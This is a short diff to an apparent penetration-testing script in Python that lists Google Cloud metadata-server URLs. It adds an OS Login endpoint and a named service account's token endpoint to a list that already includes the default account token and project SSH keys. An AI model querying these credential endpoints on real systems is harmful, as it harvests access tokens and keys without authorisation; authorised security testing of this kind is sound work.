@@ -5,6 +5,7 @@ import urllib
 import urllib2
 URLS=[
     "http://metadata.google.internal/computeMetadata/v1beta1/",
+    "http://metadata.google.internal/computeMetadata/v1beta1/oslogin",
     "http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname",
     "http://metadata.google.internal/computeMetadata/v1beta1/instance/id",
 
@@ -19,6 +20,7 @@ URLS=[
     "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
 
     "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/",
+    "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/worker@lgtm-penetration-testing.iam.gserviceaccount.com/token",
 
     "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys",
 
